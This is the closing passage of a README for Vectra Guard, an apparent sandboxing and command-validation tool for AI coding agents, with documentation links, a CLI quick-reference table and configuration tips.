- **[CONFIGURATION.md](CONFIGURATION.md)** - Detailed configuration guide with presets
- **[ADVANCED_FEATURES.md](ADVANCED_FEATURES.md)** - Advanced features and capabilities

### Sandbox & Performance
- **[SANDBOX.md](SANDBOX.md)** - Complete sandbox guide including:
  - Docker, Podman, Bubblewrap, and namespace runtimes
  - Intelligent cache mounting (10x faster installs)
  - Runtime auto-selection based on environment
  - Performance optimization tips

### Security
- **[SECURITY.md](SECURITY.md)** - Comprehensive security guide including:
  - Security model for dev and production
  - Security improvements and incident response
  - Security testing procedures
  - Best practices and troubleshooting

### Release Information
- **[docs/releases/RELEASE_NOTES_v0.0.1.md](docs/releases/RELEASE_NOTES_v0.0.1.md)** - Release notes
- **[docs/releases/RELEASE_CHECKLIST_v0.0.1.md](docs/releases/RELEASE_CHECKLIST_v0.0.1.md)** - Release checklist

---

## 📜 License

Apache License 2.0 - See [LICENSE](LICENSE) for details.

---

## 🌟 Part of VectraHub

Vectra Guard is part of the **VectraHub** ecosystem for secure AI agent development and deployment.

**Repository**: https://github.com/xadnavyaai/vectra-guard

---

## 🎯 Quick Reference

| Task | Command |
|------|---------|
| **Install shell tracker** | `./scripts/install-shell-tracker.sh` |
| **Initialize config** | `vectra-guard init` (or `vg init`) |
| **Validate script** | `vg validate script.sh` |
| **Explain risks** | `vg explain script.sh` |
| **Protected execution** | `vg exec -- command` |
| **Override guard level** | `VECTRA_GUARD_LEVEL=low vg exec command` |
| **Start session** | `vg session start --agent NAME` |
| **View session** | `vg session show $SESSION_ID` |
| **List sessions** | `vg session list` |
| **Enable sandbox (default)** | `sandbox: {enabled: true, mode: always}` |
| **Disable sandbox** | `sandbox: {enabled: false}` or `mode: never` |
| **Auto mode (balanced)** | `sandbox: {mode: auto}` |
| **List trusted commands** | `vg trust list` |
| **Trust a command** | `vg trust add "command"` |
| **View metrics** | `vg metrics show` |
| **Seed OpenClaw config** | `vg seed agents --targets "openclaw"` |
| **Complete feature guide** | See [FEATURES.md](FEATURES.md) |
| **Sandbox documentation** | See [SANDBOX.md](SANDBOX.md) |
| **Config examples** | See [CONFIGURATION.md](CONFIGURATION.md) |
| **Security guide** | See [SECURITY.md](SECURITY.md) |
| **Run tests** | `go test ./...` or `./scripts/test-docker.sh` |

---

## 💡 Pro Tips

### General Usage
1. **Use `level: auto`** for intelligent context-aware protection (recommended)
2. **Enable shell integration** for comprehensive coverage
3. **Configure policies per project** with `vectra-guard.yaml` in repo root
4. **Override when needed**: `VECTRA_GUARD_LEVEL=low vg exec command`
5. **Use the `vg` alias** for faster workflows

### Sandbox Optimization 🚀
6. **Caching enabled by default** - 10x speedup automatically! First run normal, subsequent runs fast
7. **30+ cache directories** automatically mounted (npm, pip, cargo, go, maven, gradle, etc.)
8. **Trust common commands** to skip sandbox: `vg trust add "npm test"`
9. **Check metrics weekly** to see time saved: `vg metrics show`
10. **Disable if needed**: `sandbox: {enabled: false}` or `mode: never` (critical commands still protected)

### Security Best Practices
11. **Review session logs regularly** to understand agent behavior
12. **Share configs with team** via git for consistent protection
13. **Teach it your patterns** in `production_indicators` for better detection
14. **Test scripts before committing** with `vg validate script.sh`
15. **Use paranoid mode for production**: `security_level: paranoid`

### Productivity Hacks
16. **Approve and remember** common commands with 'r' option
17. **Use presets** in [CONFIGURATION.md](CONFIGURATION.md) for quick setup
18. **Run `vg metrics show`** to celebrate time saved! 🎉
19. **Clear trust store periodically**: `vg trust clean`
20. **Work offline** - cache has you covered once populated!

---

<div align="center">

**Stay Safe. Code Fearlessly.** 🛡️

[Report Bug](https://github.com/xadnavyaai/vectra-guard/issues) · [Request Feature](https://github.com/xadnavyaai/vectra-guard/issues) · [Documentation](https://github.com/xadnavyaai/vectra-guard)

</div>
